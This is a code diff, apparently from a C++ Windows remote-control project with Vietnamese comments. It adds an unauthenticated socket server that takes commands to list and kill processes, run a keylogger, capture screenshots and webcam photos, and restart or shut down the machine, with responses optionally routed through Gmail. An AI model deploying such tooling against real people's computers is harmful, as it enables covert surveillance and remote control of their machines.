@@ -108,6 +108,77 @@ void receiveFile(SOCKET sock)
     std::cout << "File content received from client." << std::endl;
 }
 
+void startSocketServer()
+{
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
+    if (serverSock == INVALID_SOCKET)
+    {
+        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        return;
+    }
+
+    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
+    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    {
+        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
+        closesocket(serverSock);
+        WSACleanup();
+        return;
+    }
+
+    listen(serverSock, 1);
+    std::cout << "Server is listening on port 12345..." << std::endl;
+
+    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
+    if (clientSock == INVALID_SOCKET)
+    {
+        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
+        closesocket(serverSock);
+        WSACleanup();
+        return;
+    }
+    std::cout << "Client connected." << std::endl;
+
+    // Nhận lệnh từ client
+    char buffer[1024];
+    while (true)
+    {
+        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
+        if (len <= 0) 
+        {
+            std::cout << "Client disconnected." << std::endl;
+            break;
+        }
+
+        buffer[len] = '\0';
+        std::string cmd(buffer);
+        std::cout << "Received command from client: " << cmd << std::endl;
+
+        // Xử lý lệnh trên server
+        handleCommand(clientSock, cmd);
+    }
+
+    closesocket(clientSock);
+    closesocket(serverSock);
+    WSACleanup();
+}
+
+void sendResponse(SOCKET sock, const std::string& msg)
+{
+    if (sock != INVALID_SOCKET)
+    {
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else
+    {
+        std::cout << "[Gmail Response]" << msg << std::endl;
+    }
+}
+
 void handleCommand(SOCKET sock, const std::string& cmd)
 {
     if (cmd == "help")
@@ -125,12 +196,12 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  restart                 - Restart the system\n"
             "  shutdown                - Shutdown the system\n"
             "  exit                    - Disconnect from server\n";
-        send(sock, helpMsg.c_str(), helpMsg.size(), 0);
+        sendResponse(sock, helpMsg);
     }
     else if (cmd == "list")
     {
         std::string processes = listProcesses();
-        send(sock, processes.c_str(), processes.size(), 0);
+        sendResponse(sock, processes);
     }
     else if (cmd.rfind("start ", 0) == 0)
     {
@@ -138,26 +209,26 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         bool ok = startProcess(path);
         
         std::string msg = ok ? "Process started successfully." : "Failed to start process.";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
     else if (cmd.rfind("stop ", 0) == 0)
     {
         std::string name = cmd.substr(5);
         bool ok = stopProcess(name);
         std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
     else if (cmd == "start_keylogger")
     {
         startKeylogger();
         std::string msg = "Keylogger started.";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
     else if (cmd == "stop_keylogger")
     {
         stopKeylogger();
         std::string msg = "Keylogger stopped.";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
     else if (cmd.rfind("screenshot ", 0) == 0)
     {
@@ -177,12 +248,12 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string msg = success ? 
             "Screenshot captured successfully: " + filename : 
             "Failed to capture screenshot.";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
     else if (cmd == "restart")
     {
         std::string msg = "Initiating system restart...";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
         
         // Delay một chút để gửi response trước khi restart
         Sleep(1000);
@@ -191,14 +262,14 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         if (!success)
         {
             std::string errorMsg = "Failed to restart system.";
-            send(sock, errorMsg.c_str(), errorMsg.size(), 0);
+            sendResponse(sock, errorMsg);
         }
         // Nếu restart thành công, connection sẽ bị đóng do máy restart
     }
     else if (cmd == "shutdown")
     {
         std::string msg = "Initiating system shutdown...";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
         
         // Delay một chút để gửi response trước khi shutdown
         Sleep(1000);
@@ -207,7 +278,7 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         if (!success)
         {
             std::string errorMsg = "Failed to shutdown system.";
-            send(sock, errorMsg.c_str(), errorMsg.size(), 0);
+            sendResponse(sock, errorMsg);
         }
         // Nếu shutdown thành công, connection sẽ bị đóng do máy tắt
     }
@@ -220,18 +291,18 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         }
         
         std::string startMsg = "Capturing webcam photo: " + filename + "...";
-        send(sock, startMsg.c_str(), startMsg.size(), 0);
+        sendResponse(sock, startMsg);
         
         bool success = captureWebcamPhoto(filename);
         std::string msg = success ? 
             "Webcam photo captured successfully: " + filename : 
             "Failed to capture webcam photo.";
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
     else
     {
         std::string msg = "Unknown command: " + cmd;
-        send(sock, msg.c_str(), msg.size(), 0);
+        sendResponse(sock, msg);
     }
 }
 
